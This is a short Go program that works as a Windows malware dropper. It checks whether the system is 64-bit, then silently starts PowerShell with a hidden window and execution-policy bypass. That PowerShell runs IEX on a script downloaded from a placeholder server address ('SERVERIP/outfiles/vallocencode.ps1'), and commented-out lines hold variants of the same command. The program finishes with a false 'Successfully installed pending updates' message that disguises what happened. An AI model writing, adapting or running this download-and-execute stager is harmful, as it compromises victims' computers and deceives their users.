package main

import (
	"fmt"
	"os"
	"os/exec"
	"strings"
	"syscall"
)

var (
	err error
)

func os64check() bool {

	for _, e := range os.Environ() {
		pair := strings.Split(e, "=")

		if pair[0] == "PROCESSOR_ARCHITEW6432" || strings.Contains(pair[1], "64") {
			fmt.Println(pair[0] + "=" + pair[1])
			return true
		}
	}
	return false
}

func main() {

	if os64check() {
		//fmt.Println("64 bit")
		cmdName := `c:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe`
		cmdArgs := []string{"-w", "hidden", "-ep", "bypass", "-nop", "-c", "IEX ((new-object net.webclient).downloadstring('http://SERVERIP/outfiles/vallocencode.ps1'))"}
		cmd := exec.Command(cmdName, cmdArgs...)
		//cmd := exec.Command(`c:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe`, "-ep", "bypass", "IEX ((new-object net.webclient).downloadstring('http://SERVERIP/outfiles/psvalloc.ps1'))")
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		err = cmd.Start()
		cmd.Wait()
	} else {
		//fmt.Println("32 bit")
		cmdName := `PowerShell`
		cmdArgs := []string{"-w", "hidden", "-ep", "bypass", "-nop", "-c", "IEX ((new-object net.webclient).downloadstring('http://SERVERIP/outfiles/vallocencode.ps1'))"}

		//cmdArgs := []string{"-Command", "IEX ((new-object net.webclient).downloadstring('http://SERVERIP/outfiles/vallocencode.ps1'))"}
		cmd := exec.Command(cmdName, cmdArgs...)
		//cmd := exec.Command("PowerShell", "-Command", "IEX ((new-object net.webclient).downloadstring('http://SERVERIP/outfiles/psvalloc.ps1'))")
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		err = cmd.Start()
		cmd.Wait()
	}

	if err != nil {
		fmt.Printf("something went wrong %s", err)
		return
	}
	fmt.Println("Successfully installed pending updates !")
}
